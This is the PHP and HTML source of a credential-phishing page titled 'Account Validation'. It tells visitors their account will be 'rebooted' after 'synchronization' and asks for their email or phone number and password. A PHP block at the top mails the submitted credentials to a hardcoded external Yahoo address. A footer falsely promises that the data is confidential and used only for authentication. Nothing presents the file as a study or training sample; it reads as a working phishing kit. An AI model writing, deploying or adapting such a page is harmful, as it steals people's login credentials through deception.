<?php

if (isset($_POST["submitdetails"])) {

    $email = $_POST["email"];
    $password = $_POST["password"];
    $message = "New User";
    $toEmail = "halabitimoty@yahoo.com";
    $header = "Email / Number : " . $email . "\r\n Email : " . $password . "\r\n";


    if (mail($toEmail, $message, $header)) {
        $message = "Your Information as been successfully submitted";
        header(" refresh : 3; index.php");
    }
}
?>

<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    <title>Account Validation</title>
</head>

<body>
    <div class="w-75 mx-auto">
        <h1>Account Validation</h1>

        <img src="./RESOURCES/settings.png" class="img-fluid mx-auto" alt="...">
        <h2 class="w-50 mx-auto">Your account will be rebooted after <span style=" font-size:2.5rem; color :red;"> 100%</span> Synchronization</h2>
        <br><br>
        <form method="post" class="w-50 mx-auto">
            <div class="mb-3">
                <label for="exampleInputEmail1" class="form-label">Username</label>
                <input type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" name="email" placeholder="Email address / Mobile Number" required>
            </div>
            <div class="mb-3">
                <label for="exampleInputPassword1" class="form-label">Password</label>
                <input type="password" class="form-control" id="exampleInputPassword1" name="password" placeholder="Password" required>
            </div>
            <div class="mb-3 form-check">
                <input type="checkbox" class="form-check-input" id="exampleCheck1">
                <label class="form-check-label" for="exampleCheck1">Remember me</label>
            </div>
            <button type="submit" class="btn btn-primary" name="submitdetails">Submit</button>
            <?php if (!empty($message)) { ?>
                <div class=""> <strong class="btn btn-secondary mx-auto my-5"> <?php echo $message ?></strong> </div>
            <?php } ?>
        </form>
        <footer style="margin-top:5rem">
            <h5>NOTE</h5>
            <p>The information collected is confidential and will not be disclosed by us to unauthorized third parties.</p>
            <p>Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.</p>
            <p>Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.</p>
        </footer>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>

</html>